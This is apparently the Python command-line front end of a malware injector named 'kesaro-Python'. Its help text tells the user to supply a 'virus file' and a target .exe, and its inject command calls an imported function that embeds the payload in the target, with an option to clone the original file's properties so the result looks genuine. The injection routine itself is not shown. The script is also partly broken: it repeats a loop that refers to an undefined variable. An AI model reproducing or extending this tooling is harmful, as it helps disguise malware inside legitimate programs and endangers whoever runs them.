from resources.injector import *
from resources.file_manager import *
from resources.properties_manager import *
import sys



def show_help():
    print("Welcome to the kesaro-Python tool!")
    print("=================================")
    print("Available commands:")
    print("help: Show this help message")
    print("quit: Quits the program")
    print("explain: explains how to inject files")
    print()

def execute_command(command):
    if command == 'help':
        show_help()
    elif command == 'quit':
        sys.exit("Exiting the program...")
    elif command == 'explain':
        print("   To inject the payload, use the command: inject [THE  PATH FROM YOUR VIRUS FILE HERE] > [THE PATH FROM THE FILE TO INJECT HERE]")
    if command.count(' ') > 0:
        command = command.split(' ')
    else:
        command = [command]

    if command[0] == 'inject':
        if len(command) != 4:
            print(help('inject'))
        else:
            injected_file = get_manual_path('Injected file', '.exe') if command[1] == '?' else command[1]
            target_file = get_manual_path('Target file', '.exe') if command[3] == '?' else command[3]
            if os.path.isfile(injected_file) and os.path.isfile(target_file):
                properties = True if input('(Y/n) Do you want to clone all original file\'s properties? ').lower() == 'y' else False
                try:
                    inject(injected_file, target_file, properties)
                except Exception as error:
                    print('-\n' + str(error) + '\n-')

            else:
                print('One of provided files does not exist.')

    elif command[0] == 'clear':
        os.system('cls')
        
    else:
        print("Unknown command. Please try again.")
        

def start_help_center():
    while True:
        command = input("Enter a command (type 'help' for available commands and help): ")
        execute_command(command)

start_help_center()


while True:
    if command.count(' ') > 0:
        command = command.split(' ')
    else:
        command = [command]

    if command[0] == 'inject':
        if len(command) != 4:
            print(help('inject'))
        else:
            injected_file = get_manual_path('Injected file', '.exe') if command[1] == '?' else command[1]
            target_file = get_manual_path('Target file', '.exe') if command[3] == '?' else command[3]
            if os.path.isfile(injected_file) and os.path.isfile(target_file):
                properties = True if input('(Y/n) Do you want to clone all original file\'s properties? ').lower() == 'y' else False
                try:
                    inject(injected_file, target_file, properties)
                except Exception as error:
                    print('-\n' + str(error) + '\n-')

            else:
                print('One of provided files does not exist.')

    elif command[0] == 'clear':
        os.system('cls')
